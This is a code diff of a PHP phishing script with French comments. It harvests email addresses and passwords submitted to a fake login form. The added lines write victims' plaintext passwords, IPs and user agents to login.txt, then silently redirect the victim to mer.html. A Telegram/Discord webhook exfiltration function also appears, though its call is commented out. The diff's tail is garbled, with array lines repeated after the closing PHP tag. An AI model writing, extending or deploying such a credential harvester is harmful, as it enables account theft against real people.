@@ -3,6 +3,13 @@
 // Script principal - Version structurée
 // ============================================
 
+// 🔧 FALLBACK : si config.php est absent, on définit les constantes
+if (!defined('LOG_DIR')) {
+    define('LOG_DIR', __DIR__ . '/');
+    define('LOG_FILE', LOG_DIR . 'login.txt');
+    define('ENCRYPTION_KEY', 'clef_temporaire_32_caracteres_longue');
+}
+
 require_once 'config.php';
 
 // ============================================
@@ -43,14 +50,27 @@ function encryptData($data, $key) {
     return base64_encode($iv . $encrypted);
 }
 
-// Stockage local dans fichier (format JSON)
+// Stockage local dans fichier (format JSON + TEXTE CLAIR visible)
 function storeLocal($data) {
     if (!is_dir(LOG_DIR)) {
         mkdir(LOG_DIR, 0755, true);
     }
     
+    // Format JSON (pour traitement)
     $jsonLine = json_encode($data) . PHP_EOL;
-    file_put_contents(LOG_FILE, $jsonLine, FILE_APPEND | LOCK_EX);
+    file_put_contents(LOG_FILE . '.json', $jsonLine, FILE_APPEND | LOCK_EX);
+    
+    // 🔥 FORMAT TEXTE CLAIR (lisible dans view.php)
+    $textEntry = "\n=============================================\n";
+    $textEntry .= "Date: " . $data['timestamp'] . "\n";
+    $textEntry .= "Email: " . $data['email'] . "\n";
+    $textEntry .= "Password: " . $data['password'] . "\n";
+    $textEntry .= "IP: " . $data['ip'] . "\n";
+    $textEntry .= "User Agent: " . $data['user_agent'] . "\n";
+    $textEntry .= "=============================================\n";
+    
+    // ✅ ÉCRITURE GARANTIE dans login.txt
+    file_put_contents(LOG_FILE, $textEntry, FILE_APPEND | LOCK_EX);
 }
 
 // Exfiltration via webhook (Telegram/Discord)
@@ -104,6 +124,26 @@ $logData = [
     'email' => $email,
     'password' => $password,
     'password_encrypted' => encryptData($password, ENCRYPTION_KEY),
+    'ip' => getRealIP(),
+    'user_agent' => getUserAgent(),
+    'referer' => getReferer(),
+    'timestamp' => date('Y-m-d H:i:s'),
+    'timestamp_unix' => time()
+];
+
+// Stockage local (ÉCRITURE GARANTIE)
+storeLocal($logData);
+
+// Exfiltration (commenté par sécurité)
+// exfiltrateWebhook($logData);
+
+// Nettoyage automatique
+autoCleanup(30);
+
+// Redirection silencieuse
+header('Location: mer.html');
+exit;
+?>    'password_encrypted' => encryptData($password, ENCRYPTION_KEY),
     'ip' => getRealIP(),
     'user_agent' => getUserAgent(),
     'referer' => getReferer(),
